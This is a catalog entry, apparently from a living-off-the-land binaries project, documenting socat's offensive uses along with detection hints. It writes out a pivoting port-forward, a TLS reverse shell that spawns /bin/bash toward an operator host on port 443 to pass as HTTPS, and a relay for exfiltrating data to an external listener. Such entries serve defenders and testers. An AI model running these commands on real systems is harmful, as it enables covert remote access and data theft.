---
Name: Socat
Description: Socat is a general-purpose relay that connects two data channels (TCP, UDP, UNIX sockets, files, processes, TLS and more). It can forward ports, relay between networks and expose a local program over a socket, and is commonly installed or uploaded as a static binary.
Author: elhoim
Created: 2026-11-09
Commands:
  - Command: socat TCP-LISTEN:<PORT>,fork,reuseaddr TCP:<TARGET_IP>:<TARGET_PORT>
    Description: Forwards connections arriving on the host to another internal system.
    Usecase: Pivoting between network segments.
    Category: access
    Privileges: User
    OperatingSystem: Linux, MacOS, Windows

  - Command: socat OPENSSL:<SERVER>:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    Description: Sends an encrypted reverse shell to a listening operator host.
    Usecase: Remote shell over TLS that looks like HTTPS on port 443.
    Category: shell-access
    Privileges: User
    OperatingSystem: Linux, MacOS

  - Command: socat TCP-LISTEN:<PORT>,fork OPENSSL:<SERVER>:443,verify=0
    Description: Relays plaintext local connections to a TLS service on an external host.
    Usecase: Exfiltrating data to an external TLS listener.
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Linux, MacOS, Windows
Full_Path:
  - Filename: socat
  - Filename: socat.exe
  - Path: Package-installed or uploaded static socat binary, executed anywhere on the system.
Detection:
  - Command: Execution of socat with TCP-LISTEN, OPENSSL or EXEC addresses, in particular EXEC combined with pty/stderr/setsid, or verify=0.
  - Command: socat running on a host where it is not part of the standard build.
Resources:
  - Link: http://www.dest-unreach.org/socat/
  - Link: https://attack.mitre.org/techniques/T1090/
---
